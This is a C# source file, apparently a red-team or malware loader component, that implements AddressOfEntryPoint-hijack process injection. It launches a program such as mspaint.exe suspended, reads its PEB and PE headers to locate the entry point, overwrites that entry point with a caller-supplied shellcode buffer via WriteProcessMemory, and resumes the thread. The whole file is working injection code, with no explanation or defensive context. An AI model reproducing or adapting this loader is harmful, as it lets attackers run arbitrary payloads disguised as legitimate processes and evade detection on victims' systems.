using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static AddressOfEntryPoint_Hijack.NativeStructs;
using static AddressOfEntryPoint_Hijack.NativeFunctions;
using System.Runtime.InteropServices;

namespace AddressOfEntryPoint_Hijack
{
    class AddressOfEntryPoint_Hijack
    {
        public static IntPtr Thread_handle;

        private static Object FindObjectAddress(IntPtr BaseAddress, Object StructObject, IntPtr Handle)
        {
            IntPtr ObjAllocMemAddr = Marshal.AllocHGlobal(Marshal.SizeOf(StructObject.GetType()));
            RtlZeroMemory(ObjAllocMemAddr, Marshal.SizeOf(StructObject.GetType()));

            uint getsize = 0;
            bool return_status = false;

            return_status = NtReadVirtualMemory(
                Handle,
                BaseAddress,
                ObjAllocMemAddr,
                (uint)Marshal.SizeOf(StructObject),
                ref getsize
             );

            StructObject = Marshal.PtrToStructure(ObjAllocMemAddr, StructObject.GetType());
            return StructObject;
        }

        public static IntPtr CreateProcess_custom(string OriPath)
        {
            //Paths to our files # 00007ff7`44620000          

            // string OriPath = @"C:\Windows\System32\mspaint.exe";
            // string MalPath = @"C:\Windows\System32\cmd.exe";

            //Create the process with suspended state    
            STARTUPINFO STARTUPINFO_instance = new STARTUPINFO();
            PROCESS_INFORMATION PROCESS_INFORMATION_instance = new PROCESS_INFORMATION();

            bool nt_createstatus = CreateProcess(
                null,
                OriPath,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CreateProcessFlags.CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref STARTUPINFO_instance,
                out PROCESS_INFORMATION_instance
            );

            if (nt_createstatus)
            {
                IntPtr Process_handle = PROCESS_INFORMATION_instance.hProcess;
                AddressOfEntryPoint_Hijack.Thread_handle = PROCESS_INFORMATION_instance.hThread;
                return Process_handle;
            }

            return IntPtr.Zero;
        }

        private static IntPtr Locate_AddressOfEntryPoint(IntPtr ImageBase_address, IntPtr CurrentHandle)
        {
            IMAGE_DOS_HEADER IMAGE_DOS_HEADER_instance = new IMAGE_DOS_HEADER();
            IMAGE_DOS_HEADER_instance = (IMAGE_DOS_HEADER)FindObjectAddress(
                ImageBase_address,
                IMAGE_DOS_HEADER_instance,
                CurrentHandle);

            IntPtr IMAGE_NT_HEADER64_address = (IntPtr)(ImageBase_address.ToInt64() + (int)IMAGE_DOS_HEADER_instance.e_lfanew);
            IMAGE_NT_HEADERS64 IMAGE_NT_HEADER64_instance = new IMAGE_NT_HEADERS64();
            IMAGE_NT_HEADER64_instance = (IMAGE_NT_HEADERS64)FindObjectAddress(
                IMAGE_NT_HEADER64_address,
                IMAGE_NT_HEADER64_instance,
                CurrentHandle);

            IntPtr AddressOfEntryPoint_address = (IntPtr)((UInt64)ImageBase_address 
                + (UInt64)(IMAGE_NT_HEADER64_instance.OptionalHeader.AddressOfEntryPoint));

            return AddressOfEntryPoint_address;
        }
        public static void AddressOfEntryPointHijack(byte[] buf1, string process_path)
        {
            PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION_instance = new PROCESS_BASIC_INFORMATION();
            IntPtr Process_handle = CreateProcess_custom(process_path);
            uint sizePtr = 0;

            UInt32 QueryResult = NtQueryInformationProcess(
                Process_handle,
                0,
                ref PROCESS_BASIC_INFORMATION_instance,
                Marshal.SizeOf(PROCESS_BASIC_INFORMATION_instance),
                ref sizePtr
            );

            PEB PEB_instance = new PEB();
            PEB_instance = (PEB)FindObjectAddress(
                PROCESS_BASIC_INFORMATION_instance.PebBaseAddress,
                PEB_instance,
                Process_handle);

            IntPtr ImageBase_address = PEB_instance.ImageBase_address64;
            IntPtr AddressOfEntryPoint_address = Locate_AddressOfEntryPoint(ImageBase_address, Process_handle);
            // IntPtr buf1_address = System.Runtime.InteropServices.Marshal.UnsafeAddrOfPinnedArrayElement(buf1, 0);

            bool nt_status = WriteProcessMemory(
                Process_handle,
                AddressOfEntryPoint_address,
                buf1,
                (int)buf1.Length,
                out sizePtr);
            // WriteProcessMemory(Process_handle, codeEntry, shellcode, sizeof(shellcode), NULL);
            ResumeThread(AddressOfEntryPoint_Hijack.Thread_handle);
        }
    }
}
